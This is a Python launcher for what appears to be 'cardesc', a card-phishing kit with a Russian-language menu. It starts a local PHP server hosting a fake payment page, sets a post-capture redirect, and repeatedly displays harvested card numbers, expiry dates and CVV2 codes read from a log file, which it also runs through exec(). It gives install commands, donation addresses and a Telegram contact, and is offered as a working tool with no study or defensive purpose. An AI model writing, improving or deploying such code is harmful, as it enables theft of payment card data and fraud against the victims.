import os, sys, time
from time import sleep
from multiprocessing import Process
from prettytable import PrettyTable
import os
import json
import requests

os.system('clear || cls')
with open("dist/log.log", "w") as dist:
    pass

class A:
    def __call__(self, count=10, sleep_time=0.5):
        os.system("cd dist && php -S localhost:"+str(ports))
class B:
    def __call__(self, count=10, sleep_time=0.5):
        while True:
            x = PrettyTable()
            x.field_names = ['OS', 'number', 'date', 'cvv2']
            exec(open('dist/log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear || cls")

with open('info/metadata.json') as data:
    meta = json.load(data)
def upd():
    try:
        rqst = requests.get(f"{meta['url']}", timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            metadata = rqst.text
            json_data = json.loads(metadata)
            gh_version = json_data['version']
            if (str(gh_version) > meta['version']):
                print(logo)
                print(f'\n[>]New Update Available : {gh_version}')
                print(' |--> Please install     : https://github.com/oldnum/betarla')
                print(f'[>]New Update Available : {gh_version}')
                exit()
            else:
                pass
    except Exception as exc:
        pass
upd()
logo=(f"""\n
┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
│  ├─┤├┬┘ ││├┤ └─┐│  
└─┘┴ ┴┴└──┴┘└─┘└─┘└─┘
[>] Version     : {meta['version']}
 |--> btc: {meta['donate']['btc']}          
 |--> eth: {meta['donate']['eth']}
[>] Telegram    : {meta['telegram']}\n""")
print(logo,"""
[0] История BANK
[1] CARD PAY
[2] Helping
""")
used = input("Введите номер: ")
if (used=='0'):
    try:
        os.system('clear || cls')
        print(logo)
        with open('result.log', 'r') as res:
            print(res.read())
        exit()
    except:
        exit()
elif (used=='1'):
    a=A()
elif (used == '2'):
    upd()
    os.system('clear || cls')
    print(logo)
    print(f"""#  cardesc  v.{meta['version']}
    apt update && apt upgrade
    git clone https://github.com/oldnum/cardesc
    cd cardesc
    pip3 install -r requirements.txt

#  launch
    python3 bank.py\n""")
    exit()
else:
    os.system("clear || cls")
    print(logo)
    exit()
try:
    ports = int(input("Порт (default 8080): "))
except:
    ports=8080
reloc = input("Редирект or (enter): ")

if reloc != "":
    if used == "1":
        with open("dist/location.location", 'w') as loca:
            loca.write(reloc)
    else:
        pass
else:
    if used ==  "1":
        with open("dist/location.location", 'w') as loca:
            loca.write("https://google.com")
if (ports == ""):
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()